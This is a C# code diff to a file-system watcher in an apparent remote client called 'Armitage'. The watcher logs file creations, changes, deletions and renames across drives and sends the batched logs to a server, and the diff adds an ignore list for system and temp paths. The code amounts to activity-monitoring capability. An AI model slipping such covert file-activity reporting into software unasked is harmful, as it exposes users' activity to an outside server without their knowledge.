@@ -15,6 +15,15 @@ namespace Client.Armitage.Watchers
     public static class Filesystem
     {
         /// <summary>
+        /// Paths to be ignored, reduces noise and useless things
+        /// to log.
+        /// </summary>
+        public static string[] IgnoredPaths = new string[] {
+            Utilities.FilesAndDirectories.NormalizePath(Environment.GetFolderPath(Environment.SpecialFolder.Windows)),
+            Utilities.FilesAndDirectories.NormalizePath(Path.GetTempPath())
+        };
+
+        /// <summary>
         /// The size of the logs until they got sent to the server.
         /// </summary>
         private static int _threshold = 20000; // 20kb
@@ -56,9 +65,10 @@ namespace Client.Armitage.Watchers
                         _watchers.Add(_watcher);
                     }
                 }
-                catch (Exception ex){
-                    AddLog("Error intializing filesystem recorder:\r\n"+ex.ToString()
-                        , true);
+                catch (Exception ex)
+                {
+                    AddLog("Error intializing filesystem recorder:\r\n" + ex.ToString(),
+                        "", true);
                 }
             });
         }
@@ -69,27 +79,25 @@ namespace Client.Armitage.Watchers
                 return;
             }
 
-            AddLog($"Changed: {e.FullPath}");
+            AddLog($"Changed: {e.FullPath}", e.FullPath);
         }
 
         private static void OnCreated(object sender, FileSystemEventArgs e)
         {
             string value = $"Created: {e.FullPath}";
-            AddLog(value);
+            AddLog(value, e.FullPath);
         }
 
         private static void OnDeleted(object sender, FileSystemEventArgs e) =>
-            AddLog($"Deleted: {e.FullPath}");
+            AddLog($"Deleted: {e.FullPath}", e.FullPath);
 
         private static void OnRenamed(object sender, RenamedEventArgs e)
         {
-            AddLog($"Renamed:");
-            AddLog($"    Old: {e.OldFullPath}");
-            AddLog($"    New: {e.FullPath}");
+            AddLog($"Renamed:\r\n   Old: {e.OldFullPath}\r\n    New: {e.FullPath}", e.FullPath);
         }
 
         private static void OnError(object sender, ErrorEventArgs e) =>
-            AddLog(e.GetException().ToString());
+            AddLog(e.GetException().ToString(), "");
 
         public static List<string> GetDrivesRoot()
         {
@@ -103,16 +111,22 @@ namespace Client.Armitage.Watchers
             return roots;
         }
 
-        private static void AddLog(string log, bool forcesend = false)
+        private static void AddLog(string log, string path, bool forcesend = false)
         {
-            string formatted = $"[{DateTime.Now.ToString("dd-mmm-yyyy hh:mm:ss.s")}] {log}";
-            _logs.AppendLine(formatted);
-
-            if (forcesend || _logs.Length > _threshold)
+            // check if path is blacklisted
+            // if path is null, go along
+            if (string.IsNullOrWhiteSpace(path) || !IgnoredPaths.Contains(Utilities.FilesAndDirectories.NormalizePath(path)))
             {
-                Communication.String_Stacker.Send(_logs.ToString(), Communication.String_Stacker.StringType.FileEvent);
-                Debug.WriteLine($"Filewatcher Sent: {_logs.Length}");
-                _logs.Clear();
+#if DEBUG
+                Console.WriteLine(log);
+#endif
+                string formatted = $"[{DateTime.Now.ToString("dd-mmm-yyyy hh:mm:ss.s")}] {log}";
+                _logs.AppendLine(formatted);
+                if (forcesend || _logs.Length > _threshold)
+                {
+                    Communication.String_Stacker.Send(_logs.ToString(), Communication.String_Stacker.StringType.FileEvent);
+                    _logs.Clear();
+                }
             }
         }
     }
